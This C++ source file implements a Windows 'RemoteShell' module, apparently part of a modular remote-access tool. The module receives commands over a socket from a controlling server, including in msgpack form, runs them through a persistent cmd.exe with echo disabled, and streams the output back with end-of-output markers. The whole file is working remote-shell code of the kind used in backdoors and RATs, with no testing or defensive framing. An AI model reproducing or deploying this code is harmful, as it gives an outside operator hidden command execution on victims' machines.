#include "../headers/remote_shell_module.h"
#include <iostream>
#include <sstream>
#include <cstring>
#include <future>
#include <chrono>
#include <algorithm>

const int BUFFER_SIZE = 4096;

RemoteShell_Module::RemoteShell_Module() : shellActive(false), clientSocket(INVALID_SOCKET),
    hChildStdin_Rd(NULL), hChildStdin_Wr(NULL),
    hChildStdout_Rd(NULL), hChildStdout_Wr(NULL),
    hChildStderr_Rd(NULL), hChildStderr_Wr(NULL) {
    ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));
    std::cout << "[RemoteShell] Module initialized" << std::endl;
}

RemoteShell_Module::~RemoteShell_Module() {
    stopRemoteShell();
    cleanupShellProcess();
}

const char* RemoteShell_Module::name() const {
    return "RemoteShell";
}

void RemoteShell_Module::run() {
    std::cout << "[RemoteShell] Module run() called - use startRemoteShell() to begin shell session" << std::endl;
}

bool RemoteShell_Module::startRemoteShell(SOCKET sock) {
    if (shellActive.load()) {
        std::cout << "[RemoteShell] Remote shell is already active!" << std::endl;
        return false;
    }

    if (sock == INVALID_SOCKET) {
        std::cerr << "[RemoteShell] Invalid socket provided" << std::endl;
        return false;
    }

    try {
        clientSocket = sock;
        shellActive = true;
        
        // Start shell session in a separate thread
        shellThread = std::thread(&RemoteShell_Module::shellLoop, this, sock);
        
        std::cout << "[RemoteShell] Remote shell started" << std::endl;
        return true;
    } catch (const std::exception& e) {
        std::cerr << "[RemoteShell] Failed to start shell thread: " << e.what() << std::endl;
        shellActive = false;
        return false;
    }
}

void RemoteShell_Module::stopRemoteShell() {
    if (shellActive.load()) {
        std::cout << "[RemoteShell] Stopping remote shell..." << std::endl;
        shellActive = false;
        
        // Clean up the shell process first
        cleanupShellProcess();
        
        // Safely close the socket
        {
            std::lock_guard<std::mutex> lock(socketMutex);
            if (clientSocket != INVALID_SOCKET) {
                shutdown(clientSocket, SD_BOTH);
                clientSocket = INVALID_SOCKET;
            }
        }
        
        if (shellThread.joinable()) {
            // Give the thread some time to finish gracefully
            auto future = std::async(std::launch::async, [this]() {
                if (shellThread.joinable()) {
                    shellThread.join();
                }
            });
            
            // Wait for up to 5 seconds for the thread to finish
            if (future.wait_for(std::chrono::seconds(5)) == std::future_status::timeout) {
                std::cerr << "[RemoteShell] Warning: Shell thread did not finish within timeout" << std::endl;
                // Thread will be detached when destructed
                shellThread.detach();
            }
        }
        
        std::cout << "[RemoteShell] Remote shell stopped" << std::endl;
    }
}

bool RemoteShell_Module::isShellActive() const {
    return shellActive.load();
}

void RemoteShell_Module::shellLoop(SOCKET sock) {
    std::cout << "[RemoteShell] Shell session started, creating persistent cmd.exe process..." << std::endl;
    
    // Create the persistent shell process
    if (!createShellProcess()) {
        std::cout << "[RemoteShell] Failed to create shell process" << std::endl;
        shellActive = false;
        return;
    }
    
    // Send initial ready message
    if (!send_message(sock, "REMOTE_SHELL_READY")) {
        std::cout << "[RemoteShell] Failed to send ready message" << std::endl;
        shellActive = false;
        return;
    }
    
    std::cout << "[RemoteShell] Waiting for commands..." << std::endl;
    
    while (shellActive.load()) {
        std::string command;
        if (!receiveCommand(sock, command)) {
            std::cout << "[RemoteShell] Failed to receive command or connection lost" << std::endl;
            break;
        }
        
        if (command == "exit" || command == "quit") {
            std::cout << "[RemoteShell] Exit command received" << std::endl;
            break;
        }
        
        if (command.empty()) {
            continue;
        }
        
        std::cout << "[RemoteShell] Executing command: " << command << std::endl;
        
        std::string output = executeCommand(command);
        
        if (!sendOutput(sock, output)) {
            std::cout << "[RemoteShell] Failed to send command output" << std::endl;
            break;
        }
        
        // Send end marker that matches the expected protocol
        {
            std::lock_guard<std::mutex> lock(socketMutex);
            if (sock != INVALID_SOCKET && shellActive.load()) {
                std::string endMarker = "<END_OF_OUTPUT>\n";
                if (send(sock, endMarker.c_str(), endMarker.length(), 0) == SOCKET_ERROR) {
                    std::cout << "[RemoteShell] Failed to send end marker" << std::endl;
                    break;
                }
            } else {
                break;
            }
        }
    }
    
    shellActive = false;
    std::cout << "[RemoteShell] Shell session ended" << std::endl;
}

bool RemoteShell_Module::createShellProcess() {
    std::lock_guard<std::mutex> lock(processMutex);
    
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;
    
    // Create pipes for stdin
    if (!CreatePipe(&hChildStdin_Rd, &hChildStdin_Wr, &saAttr, 0)) {
        std::cerr << "[RemoteShell] Failed to create stdin pipe" << std::endl;
        return false;
    }
    if (!SetHandleInformation(hChildStdin_Wr, HANDLE_FLAG_INHERIT, 0)) {
        std::cerr << "[RemoteShell] Failed to set stdin pipe handle info" << std::endl;
        return false;
    }
    
    // Create pipes for stdout
    if (!CreatePipe(&hChildStdout_Rd, &hChildStdout_Wr, &saAttr, 0)) {
        std::cerr << "[RemoteShell] Failed to create stdout pipe" << std::endl;
        return false;
    }
    if (!SetHandleInformation(hChildStdout_Rd, HANDLE_FLAG_INHERIT, 0)) {
        std::cerr << "[RemoteShell] Failed to set stdout pipe handle info" << std::endl;
        return false;
    }
    
    // Create pipes for stderr
    if (!CreatePipe(&hChildStderr_Rd, &hChildStderr_Wr, &saAttr, 0)) {
        std::cerr << "[RemoteShell] Failed to create stderr pipe" << std::endl;
        return false;
    }
    if (!SetHandleInformation(hChildStderr_Rd, HANDLE_FLAG_INHERIT, 0)) {
        std::cerr << "[RemoteShell] Failed to set stderr pipe handle info" << std::endl;
        return false;
    }
    
    // Create the child process (cmd.exe)
    STARTUPINFO siStartInfo;
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = hChildStderr_Wr;
    siStartInfo.hStdOutput = hChildStdout_Wr;
    siStartInfo.hStdInput = hChildStdin_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
    
    // Create cmd.exe process
    TCHAR cmdLine[] = TEXT("cmd.exe /Q"); // /Q disables echo
    BOOL success = CreateProcess(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &processInfo);
    
    // Close handles to the child process's pipes we don't need
    CloseHandle(hChildStdout_Wr);
    CloseHandle(hChildStderr_Wr);
    CloseHandle(hChildStdin_Rd);
    hChildStdout_Wr = NULL;
    hChildStderr_Wr = NULL;
    hChildStdin_Rd = NULL;
    
    if (!success) {
        std::cerr << "[RemoteShell] Failed to create cmd.exe process: " << GetLastError() << std::endl;
        cleanupShellProcess();
        return false;
    }
    
    std::cout << "[RemoteShell] Created persistent cmd.exe process" << std::endl;
    return true;
}

void RemoteShell_Module::cleanupShellProcess() {
    std::lock_guard<std::mutex> lock(processMutex);
    
    // Terminate the process if it's still running
    if (processInfo.hProcess != NULL) {
        TerminateProcess(processInfo.hProcess, 0);
        CloseHandle(processInfo.hProcess);
        CloseHandle(processInfo.hThread);
        processInfo.hProcess = NULL;
        processInfo.hThread = NULL;
    }
    
    // Close pipe handles
    if (hChildStdin_Rd) { CloseHandle(hChildStdin_Rd); hChildStdin_Rd = NULL; }
    if (hChildStdin_Wr) { CloseHandle(hChildStdin_Wr); hChildStdin_Wr = NULL; }
    if (hChildStdout_Rd) { CloseHandle(hChildStdout_Rd); hChildStdout_Rd = NULL; }
    if (hChildStdout_Wr) { CloseHandle(hChildStdout_Wr); hChildStdout_Wr = NULL; }
    if (hChildStderr_Rd) { CloseHandle(hChildStderr_Rd); hChildStderr_Rd = NULL; }
    if (hChildStderr_Wr) { CloseHandle(hChildStderr_Wr); hChildStderr_Wr = NULL; }
}

std::string RemoteShell_Module::readFromPipe(HANDLE hPipe, DWORD timeout) {
    std::string result;
    const DWORD BUFFER_SIZE_PIPE = 4096;
    char buffer[BUFFER_SIZE_PIPE];
    DWORD bytesRead;
    DWORD totalBytesAvail;
    
    DWORD startTime = GetTickCount();
    
    while (GetTickCount() - startTime < timeout) {
        // Check if data is available
        if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &totalBytesAvail, NULL)) {
            break;
        }
        
        if (totalBytesAvail > 0) {
            DWORD bytesToRead = std::min(totalBytesAvail, BUFFER_SIZE_PIPE - 1);
            if (ReadFile(hPipe, buffer, bytesToRead, &bytesRead, NULL) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                result += std::string(buffer, bytesRead);
                startTime = GetTickCount(); // Reset timeout on successful read
            }
        } else {
            Sleep(10); // Small delay to avoid busy waiting
        }
    }
    
    return result;
}

std::string RemoteShell_Module::executeCommand(const std::string& command) {
    if (command.empty()) {
        return "";
    }
    
    std::lock_guard<std::mutex> lock(processMutex);
    
    // Check if process is still alive
    if (processInfo.hProcess == NULL || WaitForSingleObject(processInfo.hProcess, 0) == WAIT_OBJECT_0) {
        std::cout << "[RemoteShell] Shell process died, recreating..." << std::endl;
        cleanupShellProcess();
        if (!createShellProcess()) {
            return "Failed to create shell process\n";
        }
    }
    
    // Handle special commands
    std::string trimmedCmd = command;
    // Remove leading/trailing whitespace
    size_t start = trimmedCmd.find_first_not_of(" \t\r\n");
    if (start == std::string::npos) {
        return ""; // Empty command
    }
    trimmedCmd = trimmedCmd.substr(start);
    size_t end = trimmedCmd.find_last_not_of(" \t\r\n");
    if (end != std::string::npos) {
        trimmedCmd = trimmedCmd.substr(0, end + 1);
    }
    
    // For cd command, also execute pwd to show current directory
    std::string cmdToSend = command;
    bool isCdCommand = (trimmedCmd.substr(0, 2) == "cd" && (trimmedCmd.length() == 2 || trimmedCmd[2] == ' '));
    if (isCdCommand) {
        cmdToSend = command + " && echo Current directory: && cd";
    }
    
    // Send command to cmd.exe
    std::string cmdWithNewline = cmdToSend + "\r\n";
    DWORD bytesWritten;
    if (!WriteFile(hChildStdin_Wr, cmdWithNewline.c_str(), cmdWithNewline.length(), &bytesWritten, NULL)) {
        std::cerr << "[RemoteShell] Failed to write command to pipe: " << GetLastError() << std::endl;
        return "Failed to send command to shell\n";
    }
    
    // For commands that might take time, use longer timeout
    DWORD timeout = 5000; // 5 seconds default
    if (trimmedCmd.find("ping") == 0 || trimmedCmd.find("timeout") == 0) {
        timeout = 30000; // 30 seconds for network commands
    }
    
    // Read output from stdout
    std::string output = readFromPipe(hChildStdout_Rd, timeout);
    
    // Read any error output
    std::string errorOutput = readFromPipe(hChildStderr_Rd, 1000); // 1 second timeout for errors
    if (!errorOutput.empty()) {
        if (!output.empty()) output += "\n";
        output += "STDERR: " + errorOutput;
    }
    
    // If no output, provide feedback
    if (output.empty()) {
        if (isCdCommand) {
            output = "Directory changed (no output)\n";
        } else {
            output = "Command executed (no output)\n";
        }
    }
    
    return output;
}

bool RemoteShell_Module::sendOutput(SOCKET sock, const std::string& output) {
    if (output.empty()) {
        return true;
    }
    
    std::lock_guard<std::mutex> lock(socketMutex);
    
    // Check if socket is still valid
    if (sock == INVALID_SOCKET || !shellActive.load()) {
        return false;
    }
    
    // Send output directly as raw text to match the expected protocol
    int sent = send(sock, output.c_str(), output.length(), 0);
    if (sent == SOCKET_ERROR) {
        std::cerr << "[RemoteShell] Failed to send output, error: " << WSAGetLastError() << std::endl;
        return false;
    }
    
    return true;
}

bool RemoteShell_Module::receiveCommand(SOCKET sock, std::string& command) {
    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);
    
    int received;
    {
        std::lock_guard<std::mutex> lock(socketMutex);
        
        // Check if socket is still valid and shell is active
        if (sock == INVALID_SOCKET || !shellActive.load()) {
            return false;
        }
        
        received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
    }
    
    if (received <= 0) {
        if (received == 0) {
            std::cout << "[RemoteShell] Server closed connection" << std::endl;
        } else {
            std::cerr << "[RemoteShell] Receive failed with error: " << WSAGetLastError() << std::endl;
        }
        return false;
    }
    
    buffer[received] = '\0';
    
    // Try to parse msgpack format first
    try {
        std::string raw_data(buffer, received);
        
        // Check if this looks like msgpack format
        if (received > 2 && (unsigned char)buffer[0] == 0x91) {
            // This is a msgpack array with one element
            msgpack::object_handle oh = msgpack::unpack(buffer, received);
            msgpack::object obj = oh.get();
            
            if (obj.type == msgpack::type::ARRAY && obj.via.array.size > 0) {
                msgpack::object first_elem = obj.via.array.ptr[0];
                if (first_elem.type == msgpack::type::MAP) {
                    // Look for "content" key
                    for (uint32_t i = 0; i < first_elem.via.map.size; i++) {
                        msgpack::object key = first_elem.via.map.ptr[i].key;
                        msgpack::object val = first_elem.via.map.ptr[i].val;
                        
                        if (key.type == msgpack::type::STR) {
                            std::string key_str(key.via.str.ptr, key.via.str.size);
                            if (key_str == "content" && val.type == msgpack::type::STR) {
                                command = std::string(val.via.str.ptr, val.via.str.size);
                                break;
                            }
                        }
                    }
                }
            }
        } else {
            // Try direct string parsing for simple cases
            command = std::string(buffer, received);
        }
    } catch (const std::exception& e) {
        std::cout << "[RemoteShell] Failed to parse msgpack, using raw data: " << e.what() << std::endl;
        command = std::string(buffer, received);
    } catch (...) {
        std::cout << "[RemoteShell] Unknown error parsing msgpack, using raw data" << std::endl;
        command = std::string(buffer, received);
    }
    
    // If command is still empty, use raw buffer as fallback
    if (command.empty() && received > 0) {
        command = std::string(buffer, received);
    }
    
    // Remove trailing newline/carriage return
    while (!command.empty() && (command.back() == '\n' || command.back() == '\r')) {
        command.pop_back();
    }
    
    return true;
}
